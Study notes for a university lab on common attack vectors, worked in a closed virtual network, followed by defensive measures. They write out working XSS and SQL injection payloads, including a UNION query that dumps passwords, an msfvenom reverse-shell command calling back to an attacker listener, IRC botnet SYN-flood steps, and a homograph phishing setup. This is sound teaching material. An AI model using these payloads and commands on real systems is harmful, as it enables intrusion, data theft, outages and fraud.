# 📚 ICS 169 – Lab 6: Assessing Common Attack Vectors
## Complete Notes

---

## 📖 Table of Contents

1. [Core Concepts & Introduction](#-core-concepts--introduction)
2. [Section 1, Part 1: Perform an Injection Attack](#-section-1-part-1-perform-an-injection-attack)
3. [Section 1, Part 2: Perform a Malware Attack](#-section-1-part-2-perform-a-malware-attack)
4. [Section 2, Part 1: Perform a Distributed Denial-of-Service Attack](#-section-2-part-1-perform-a-distributed-denial-of-service-attack)
5. [Section 2, Part 2: Perform a Social Engineering Attack](#-section-2-part-2-perform-a-social-engineering-attack)
6. [Section 3: Challenge & Analysis – Defensive Measures](#-section-3-challenge--analysis--defensive-measures)
7. [Master Command Reference](#-master-command-reference)
8. [Comprehensive Vocabulary](#-comprehensive-vocabulary)
9. [Lab Deliverables Checklist](#-lab-6-deliverables-checklist)
10. [Key Takeaways](#-key-takeaways--lab-6)

---

## 🎯 Core Concepts & Introduction

### Attack Vectors Covered in This Lab

| Attack Vector | Description |
|---------------|-------------|
| **Credential Stealing** | Acquiring/guessing login credentials from authorized users. |
| **Injection Attacks** | Providing input data that results in unexpected behavior. |
| **Session Hijacking** | Taking over a session after an authorized user initiates it. |
| **Malware Attacks** | Getting unsuspecting victims to execute code that carries out attack actions. |
| **Denial-of-Service (DoS) Attacks** | Overwhelming servers or services to interrupt normal processing. |
| **Social Engineering Attacks** | Tricking authorized users into carrying out attack activities. |
| **Misconfiguration Attacks** | Gaining access or causing damage due to poorly configured hardware or software. |

### Common Motives for Attackers

| Motive | Description |
|--------|-------------|
| **Revenge** | Personal grievances against an organization or individual. |
| **Activism** | Political or social causes (hacktivism). |
| **Financial Gain** | Stealing money, data for ransom, or selling stolen information. |
| **Statecraft / Warfare** | Espionage, disrupting critical infrastructure, or military objectives. |

---

### Lab Topology Summary (Lab 6)

| Device | IP Address | OS / Role |
|--------|------------|-----------|
| vWorkstation | 172.30.0.2 | Windows Server 2016 (Target / Victim) |
| pfSense | 172.30.0.1 / 201.10.1.1 / 172.31.0.0 | FreeBSD / Firewall-Router |
| WebServer01 | 172.31.0.86 | Ubuntu 20 / OWASP Juice Shop |
| TargetWindows02 | 172.31.0.10 | Windows Server 2019 |
| AttackLinux01 | 202.20.2.4 | Kali Linux (Attacker) |
| TargetPi | 203.30.3.5 | Raspberry Pi OS (Bot) |
| DebNet | 204.40.4.6 | Debian 11 (Bot / IRC Server) |
| TargetLinux02 | 205.50.5.7 | Ubuntu 20 (Bot) |

---

## 💉 Section 1, Part 1: Perform an Injection Attack

### Cross-Site Scripting (XSS) Overview

| Type | Description |
|------|-------------|
| **DOM XSS** | Malicious code executes locally in the browser's Document Object Model (DOM) – does not involve the server. |
| **Stored (Persistent) XSS** | Malicious code is stored on the server (e.g., in a database) and served to victims later. |
| **Reflected (Non-Persistent) XSS** | Malicious code is embedded in a URL and reflected back by the server in the HTTP response. |

### SQL Injection Overview

- Targets **SQL relational database management systems (RDBMS)** .
- Attackers provide input that **terminates** the intended SQL query and **appends** their own commands.
- Can be used to:
  - **Exfiltrate** data (steal records).
  - **Modify** data.
  - **Execute** operating system commands (in some cases).
  - **Bypass** authentication.

### Key Techniques Demonstrated

| Technique | Description | Example Used |
|-----------|-------------|--------------|
| **Terminating Characters** | Using `'` or `--` to end the intended SQL query. | `' OR true--` |
| **UNION Operator** | Combining results of multiple SELECT statements. | `UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--` |
| **Blind SQL Injection** | Probing with guesses when error messages are limited. | `' ) )--` to determine parentheses depth. |

### Hands-On Actions: Injection Attacks

| Step | Action | Vulnerability Exploited |
|------|--------|-------------------------|
| 1 | Open Firefox → `juiceshop.com` | — |
| 2 | Search: `<h1>Hey there, World</h1>` | HTML injection |
| 3 | Search: `<iframe src="javascript:alert(\`xss\`)">` | **DOM XSS** |
| 4 | ✅ Screen capture – DOM XSS dialog box | — |
| 5 | Login with: `' OR true--` | **SQL Injection** (bypass authentication) |
| 6 | ✅ Screen capture – Successful admin login | — |
| 7 | Modify URL: `?id=<iframe src="javascript:alert(\`xss\`)">` | **Reflected XSS** |
| 8 | ✅ Screen capture – Successful reflected XSS injection | — |
| 9 | SQL UNION query: `q=nonsense')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--` | **SQL UNION Injection** |
| 10 | ✅ Screen capture – User with @owasp.org email | — |

### Injection Attack Examples

**Basic SQL Injection (Bypass Authentication):**
```
Email: ' OR true--
Password: sdf
```
- The `'` terminates the input string.
- `OR true--` makes the condition always true and comments out the rest of the query.
- Returns the first account (Admin).

**UNION-Based SQL Injection:**
```
q=nonsense')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
```
- `nonsense` ensures no products match.
- `'))` closes the original SQL query's parentheses.
- `UNION SELECT` combines results from the `Users` table.
- Returns user IDs, emails, and passwords.

**Reflected XSS:**
```
http://juiceshop.com/.../track-result?id=<iframe src="javascript:alert(`xss`)">
```
- The server reflects the URL parameter back to the client.
- The browser executes the JavaScript.

---

## 🦠 Section 1, Part 2: Perform a Malware Attack

### Reverse Shell Concept

| Concept | Description |
|---------|-------------|
| **Traditional Attack** | Attacker initiates connection to target (blocked by firewalls). |
| **Reverse Shell** | Target initiates connection to attacker (outbound traffic is often allowed). |
| **Meterpreter** | Metasploit payload that runs in memory via DLL injection; avoids writing to disk. |

### Msfvenom Command Breakdown

| Argument | Purpose |
|----------|---------|
| `-p windows/x64/meterpreter/reverse_tcp` | Payload: Meterpreter reverse TCP for 64-bit Windows. |
| `LHOST=202.20.2.4` | Listener IP (AttackLinux01). |
| `LPORT=4444` | Listener port (default Metasploit port). |
| `-f exe` | Output file format (Windows executable). |
| `-o malwarePayload.exe` | Output filename. |

### Metasploit Listener Configuration

| Command | Purpose |
|---------|---------|
| `use exploit/multi/handler` | Load the listener module. |
| `set payload windows/x64/meterpreter/reverse_tcp` | Set the payload. |
| `set lhost 202.20.2.4` | Set listener IP. |
| `set lport 4444` | Set listener port. |
| `run` | Start listening. |

### Hands-On Actions: Malware Attack

| Step | Actor | Action |
|------|-------|--------|
| 1 | Attacker | Create payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=202.20.2.4 LPORT=4444 -f exe -o malwarePayload.exe` |
| 2 | Attacker | ✅ Screen capture – Msfvenom output. |
| 3 | Attacker | Start Metasploit listener. |
| 4 | Attacker | Start HTTP server: `python3 -m http.server 8080`. |
| 5 | Attacker | Inject XSS into Juice Shop Customer Feedback page. |
| 6 | Victim | Visit About Us page → downloads malware. |
| 7 | Victim | ✅ Screen capture – Opening malwarePayload.exe dialog box. |
| 8 | Victim | Run `malwarePayload.exe`. |
| 9 | Attacker | ✅ Screen capture – Output of `sysinfo` command. |

### Meterpreter Commands Used

| Command | Purpose |
|---------|---------|
| `getuid` | Identify the compromised user account. |
| `sysinfo` | Dump system information (OS, architecture, domain, logged-in users). |

### Why This Works

- Firewalls typically block **incoming** connections but allow **outgoing** connections.
- The malware **phones home** to the attacker's listener.
- The attacker does not need to compromise the firewall.

---

## 🌊 Section 2, Part 1: Perform a Distributed Denial-of-Service Attack

### Botnet Architecture

| Component | Purpose |
|-----------|---------|
| **Bot** | Compromised machine that executes commands. |
| **Command-and-Control (C2) Server** | Central server that issues commands to bots. |
| **Dropper Script** | Initial script downloaded by bots; installs the payload. |
| **Payload** | The actual malware (e.g., `debbie.py`) that connects to the C2 channel. |
| **IRC Channel** | Used for botnet command-and-control communication. |

### IRC Botnet Commands

| Command | Purpose |
|---------|---------|
| `.muster` | Bots announce themselves as ready for tasks. |
| `.opts <hostname>` | List commands available to a bot. |
| `.recruit` | Recruit new hosts into the botnet. |
| `.scout <hostname> <target>` | Scan a target IP range using Nmap. |
| `.synfl <target> <port>` | Launch a SYN flood DDoS attack. |

### SYN Flood Attack

- Sends many **SYN packets** to the target without completing the TCP handshake.
- Consumes the target's resources (or the firewall's state table).
- Prevents legitimate connections from being established.

### Hands-On Actions: DDoS Attack

| Step | Action | Purpose |
|------|--------|---------|
| 1 | Start PHP server: `php -S 202.20.2.4:80 -t /home/kali/site` | Host dropper script and payload. |
| 2 | Copy `setup.sh` to `~/site`. | Provide dropper script to bots. |
| 3 | Copy `debbie.py` to `~/site`. | Provide payload to bots. |
| 4 | Start Irssi: `/connect irc.debnet.com`, `/join #c2` | Connect to C2 IRC channel. |
| 5 | `.muster` | See available bots. |
| 6 | `.scout alfred_deborouter 204.40.4.0/24` | Scan for new targets. |
| 7 | `.recruit alfred_deborouter` | Recruit new bots. |
| 8 | `.muster` | ✅ Screen capture – Newly recruited hosts. |
| 9 | Visit `drisst.org` in Firefox | ✅ Screen capture – drisst.org webpage. |
| 10 | `.scout alfred_deborouter drisst.org` | Scan the target. |
| 11 | `.synfl drisst.org 80` | Launch SYN flood attack. |
| 12 | Refresh `drisst.org` | ✅ Screen capture – Failed connection. |
| 13 | Check pfSense firewall | ✅ Screen capture – "PF states limit reached". |

---

## 🎣 Section 2, Part 2: Perform a Social Engineering Attack

### Six Principles of Social Influence

| Principle | Description |
|-----------|-------------|
| **Reciprocity** | People feel obligated to return favors. |
| **Commitment & Consistency** | People value integrity and act consistently. |
| **Social Proof (Consensus)** | People follow the behavior of others. |
| **Authority** | People follow authoritative figures. |
| **Liking** | People are more likely to say "Yes" to people they like. |
| **Scarcity** | People value things in limited supply. |

### The Social Engineering Attack Plan

- **Target:** Alice Dodson (adodson@securelabsondemand.com).
- **Impersonated Sender:** Matt Ramone (mramone@securelabsondemand.com) – Alice's colleague and friend.
- **Exploited Principles:** Liking (trust in Matt) and Social Proof (Alice's known charitable nature).
- **Fake Charity:** Cure Strange Childhood Diseases Society (cscdsocieṭy.com – homograph attack).
- **Goal:** Collect credit card information and "donations."

### Hands-On Actions: Social Engineering Attack

| Step | Tool | Action |
|------|------|--------|
| 1 | SEToolkit | `setoolkit` → 1 (Social-Engineering) → 5 (Mass Mailer) → 1 (Single Email) |
| 2 | SET | Recipient: `adodson@securelabsondemand.com` |
| 3 | SET | Sender: `mramone@securelabsondemand.com` |
| 4 | SET | From Name: `Matt Ramone` |
| 5 | SET | SMTP Server: `smtp.normailer.com` (port 25) |
| 6 | SET | Subject: `A favor?` |
| 7 | SET | Body: Message encouraging donation to CSCD Society. |
| 8 | SET | Hyperlink: `<a href="http://cscdsocieṭy.com"> click here </a>` (using Unicode `ṭ` – U+1E6D) |
| 9 | SET | ✅ Screen capture – Finished SET phishing email composition. |
| 10 | Victim | Open Thunderbird; open email from Matt. |
| 11 | Victim | Click the link to the fake CSCD website. |
| 12 | Victim | Fill out donation form (name, institution, email, invoice #, memo). |
| 13 | Victim | Click "Process Transaction Now". |
| 14 | Victim | ✅ Screen capture – transaction.php page. |

### IDN Homograph Attack

- Uses **Unicode characters** that look identical to ASCII characters.
- The `ṭ` character (U+1E6D, Latin small letter T with dot below) looks like a regular `t`.
- Firefox determined the domain was different enough to render the homograph (not Punycode).
- **Punycode** representation: `xn--cscdsocity-i7a.com`

---

## 🛡️ Section 3: Challenge & Analysis – Defensive Measures

### Injection Attacks – Defensive Measures

**Defensive Measure 1: Parameterized Queries (Prepared Statements)**

Parameterized queries (also called prepared statements) separate user input from the SQL query logic. The database compiles the query template first, then treats user-supplied values as data parameters rather than executable code. This ensures that even if an attacker attempts to inject malicious SQL commands, the input is treated as plain data and cannot alter the query's intent. The OWASP SQL Injection Prevention Cheat Sheet identifies prepared statements as the primary defense against SQL injection flaws.

**Defensive Measure 2: Input Validation and Sanitization**

Strict input validation checks user-supplied data against expected formats, character sets, data types, and length restrictions before processing it. This prevents attackers from inserting special characters or malicious content. For XSS attacks specifically, Content Security Policy (CSP) headers can be used to control which resources the browser can load and execute, blocking unauthorized scripts. Web Application Firewalls (WAFs) can also block known attack patterns, including SQL injection payloads and XSS scripts.

---

### Malware Attacks – Defensive Measures

**Defensive Measure 1: Endpoint Detection and Response (EDR)**

EDR provides deep visibility into endpoint activity, enabling rapid detection, investigation, and response to advanced threats. Unlike traditional antivirus that relies on signature-based detection, EDR uses behavioral analytics and AI-driven threat intelligence to detect and disrupt attacker techniques, including fileless malware and in-memory attacks. When EDR is configured in block mode, it automatically blocks malicious artifacts or behaviors observed through post-breach protection.

**Defensive Measure 2: Behavioral Blocking and Attack Surface Reduction (ASR)**

Behavioral blocking capabilities identify and stop threats based on their behaviors and process trees, even when the threat has already started executing. This approach is effective against fileless malware, dynamic script-based attacks, and other non-traditional threats. Attack Surface Reduction (ASR) rules target risky software behavior that attackers commonly exploit through malware. Controlled folder access can also protect files from ransomware by allowing only trusted applications to modify files in protected folders.

---

### Denial-of-Service Attacks – Defensive Measures

**Defensive Measure 1: Rate Limiting and Traffic Filtering**

Rate limiting controls the amount of traffic allowed to reach a server, preventing a single source from overwhelming it with excessive requests. Firewalls, intrusion detection systems, and rate-limiting mechanisms can filter out malicious traffic. Blocking malicious traffic before it reaches internal systems can absorb or deflect attacks upstream. Additionally, using access control lists (ACLs) and unicast Reverse Path Forwarding (uRPF) can prevent IP address spoofing, which is commonly used in DDoS attacks.

**Defensive Measure 2: DDoS Mitigation Services and Redundancy**

Organizations typically rely on third-party DDoS mitigation providers (such as Cloudflare) or content delivery networks to automatically detect and mitigate attacks before they impact systems. These specialized services can absorb attack traffic and filter out malicious requests. Increasing bandwidth capacity and implementing service redundancy can also reduce susceptibility to DoS attacks. Understanding your environment—identifying which systems and services are publicly accessible—is a critical preparatory step.

---

### Social Engineering Attacks – Defensive Measures

**Defensive Measure 1: Security Awareness Training**

Regular security awareness training helps employees recognize social engineering tactics such as phishing, vishing, smishing, and physical impersonation. Training should cover the psychological principles attackers exploit—urgency, authority, fear, curiosity, and sympathy—and teach employees to verify suspicious requests through out-of-band channels. CISA recommends threat literacy programs that help staff understand how attackers operate through emails, websites, or social engineering and how to respond appropriately.

**Defensive Measure 2: Phishing-Resistant Multi-Factor Authentication (MFA)**

CISA strongly urges organizations to implement phishing-resistant MFA as part of Zero Trust principles. Unlike traditional MFA methods that can be bypassed through phishing, phishing-resistant MFA—such as FIDO security keys (YubiKeys) or smartcards—binds the authentication ceremony to known, registered web domains and cannot be intercepted or relayed by attackers. CISA calls phishing-resistant MFA "the gold standard of MFA" and recommends it for all accounts, especially those with privileged access.

---

### Additional Attack Vector: Session Hijacking

**Description**

Session hijacking (also known as cookie theft) occurs when an attacker steals a user's session identifier—typically transmitted as a cookie or URL parameter—and uses it to impersonate the legitimate user. Once the attacker possesses the session token, they can bypass authentication entirely, including strong or multi-factor authentication, because the server considers the session already authenticated. Attackers commonly steal session data through network sniffing over unencrypted channels (such as public Wi-Fi), exploiting software vulnerabilities, or using phishing tactics.

**Defensive Measure 1: Encrypt All Session Traffic with HTTPS/TLS**

Ensuring all session traffic is encrypted with SSL/TLS prevents attackers from intercepting plaintext session IDs over the network. HTTPS protects session cookies from being captured through man-in-the-middle attacks, even if an attacker is monitoring network traffic. This is a foundational control that should be implemented across all web applications.

**Defensive Measure 2: Short Session Lifetimes and Secure Cookie Flags**

Shortening session lifetimes limits the window an attacker has to use a stolen session token. Implementing secure cookie flags—such as `HttpOnly` (prevents client-side scripts from accessing the cookie), `Secure` (ensures the cookie is only sent over HTTPS), and `SameSite` (restricts cookie sending to same-site requests)—provides additional layers of protection against session theft. Session binding (Device Bound Session Credentials or DBSC) can also prevent hijacking by binding a user's session to their specific device.

---

## 🛠️ Master Command Reference

### Msfvenom / Metasploit

| Command | Purpose |
|---------|---------|
| `msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <file>` | Create a malicious payload. |
| `msfconsole` | Start the Metasploit Framework console. |
| `use exploit/multi/handler` | Load the listener module. |
| `set payload <payload>` | Set the payload type. |
| `set lhost <IP>` | Set listener IP. |
| `set lport <port>` | Set listener port. |
| `run` | Start the listener. |
| `getuid` | Get current user ID (Meterpreter). |
| `sysinfo` | Get system information (Meterpreter). |

### Social Engineering Toolkit (SET)

| Command | Purpose |
|---------|---------|
| `setoolkit` | Start the Social Engineering Toolkit. |
| `1` | Select Social-Engineering Attacks. |
| `5` | Select Mass Mailer Attack. |
| `1` | Select Email Attack Single Email Address. |
| `2` | Select "Use your own server or open relay". |

### IRC (Irssi) Commands

| Command | Purpose |
|---------|---------|
| `/connect <server>` | Connect to an IRC server. |
| `/join #<channel>` | Join a channel. |
| `.muster` | List available bots. |
| `.scout <bot> <target>` | Scan a target IP range. |
| `.recruit <bot>` | Recruit new bots. |
| `.synfl <target> <port>` | Launch SYN flood attack. |

### PHP Server / File Management

| Command | Purpose |
|---------|---------|
| `php -S <IP>:<port> -t <directory>` | Start a PHP web server. |
| `python3 -m http.server <port>` | Start a Python HTTP server. |
| `cp <source> <dest>` | Copy a file. |
| `mkdir <name>` | Create a directory. |
| `cd <directory>` | Change directory. |

---

## 📚 Comprehensive Vocabulary

| Term | Definition |
|------|------------|
| **Attack Vector** | A type or class of attack that provides a specific result. |
| **Injection Attack** | Providing input data that results in unexpected application behavior. |
| **XSS (Cross-Site Scripting)** | Malicious insertion of scripting code to extract data or modify a website. |
| **DOM XSS** | XSS that executes locally in the browser's DOM without server involvement. |
| **Stored XSS** | XSS where malicious code is stored on the server (database). |
| **Reflected XSS** | XSS where malicious code is reflected back by the server in a response. |
| **SQL Injection** | Injecting SQL code to manipulate database queries. |
| **UNION Operator** | SQL operator that combines results of two SELECT statements. |
| **Reverse Shell** | A shell initiated by the target that connects back to the attacker. |
| **Meterpreter** | Metasploit payload that runs in memory via DLL injection. |
| **Msfvenom** | Metasploit tool for generating malicious payloads. |
| **Botnet** | A network of compromised machines controlled by an attacker. |
| **C2 (Command-and-Control)** | Server used to issue commands to a botnet. |
| **Dropper** | Initial script downloaded by bots; installs the payload. |
| **IRC (Internet Relay Chat)** | Protocol used for botnet command-and-control. |
| **SYN Flood** | DDoS attack that sends many SYN packets without completing the handshake. |
| **Phishing** | Emails that attempt to trick recipients into performing actions. |
| **Spear Phishing** | Targeted phishing emails directed at specific individuals. |
| **Social Engineering** | Manipulating people into performing actions or divulging information. |
| **SET (Social Engineering Toolkit)** | Framework for social engineering attacks. |
| **IDN Homograph Attack** | Using Unicode characters that resemble ASCII characters in domain names. |
| **Punycode** | ASCII representation of Unicode domain names (begins with `xn--`). |

---

## 📋 Lab 6 Deliverables Checklist

### Section 1: Hands-On Demonstration

| # | Deliverable | Completed? |
|---|-------------|------------|
| 1 | DOM XSS dialog box | [ ] |
| 2 | Successful admin login | [ ] |
| 3 | Successful reflected XSS injection | [ ] |
| 4 | User with the @owasp.org email | [ ] |
| 5 | Msfvenom output | [ ] |
| 6 | Opening malwarePayload.exe dialog box | [ ] |
| 7 | Output of the sysinfo command | [ ] |

### Section 2: Applied Learning

| # | Deliverable | Completed? |
|---|-------------|------------|
| 8 | Newly recruited hosts | [ ] |
| 9 | drisst.org webpage | [ ] |
| 10 | Failed connection to drisst.org | [ ] |
| 11 | "PF states limit reached" error message | [ ] |
| 12 | Finished SET phishing email composition | [ ] |
| 13 | transaction.php page in the browser | [ ] |

### Section 3: Challenge & Analysis

| # | Deliverable | Completed? |
|---|-------------|------------|
| 14 | Two defensive measures against injection attacks + sources | [ ] |
| 15 | Two defensive measures against malware attacks + sources | [ ] |
| 16 | Two defensive measures against DoS attacks + sources | [ ] |
| 17 | Two defensive measures against social engineering attacks + sources | [ ] |
| 18 | Additional attack vector + two defensive measures + sources | [ ] |

---

## 💡 Key Takeaways – Lab 6

### Injection Attacks
1. **XSS allows attackers to run JavaScript in victims' browsers.** Never trust user input.
2. **Stored XSS** is more dangerous than reflected XSS because it persists on the server.
3. **SQL injection can bypass authentication** by making queries always true (`' OR true--`).
4. **UNION attacks** allow attackers to exfiltrate data from unrelated database tables.
5. **Never display raw error messages** to users – they reveal system information to attackers.

### Malware Attacks
6. **Reverse shells bypass firewalls** by initiating outbound connections.
7. **Meterpreter runs in memory** without writing to disk, evading many antivirus solutions.
8. **Msfvenom** allows attackers to create custom payloads for any target platform.
9. **DLL injection** allows malicious code to run under legitimate processes.

### Denial-of-Service Attacks
10. **Botnets use IRC or other protocols for command-and-control**.
11. **SYN floods consume firewall state tables**, preventing legitimate connections.
12. **DDoS attacks are difficult to defend against** due to distributed nature.

### Social Engineering Attacks
13. **Phishing-resistant MFA** is the gold standard for preventing credential theft.
14. **Security awareness training** must be ongoing, not a one-time event.
15. **IDN homograph attacks** can fool users with visually identical domain names.
16. **Never trust emails requesting sensitive information** – verify through out-of-band channels.

### General Security Principles
17. **Defense-in-depth** is critical – no single control can prevent all attacks.
18. **Automated tools** (sqlmap, EDR, WAFs) can help defend against and detect attacks.
19. **Zero Trust principles** should guide security architecture.
20. **Vulnerability assessments** help identify weaknesses before attackers exploit them.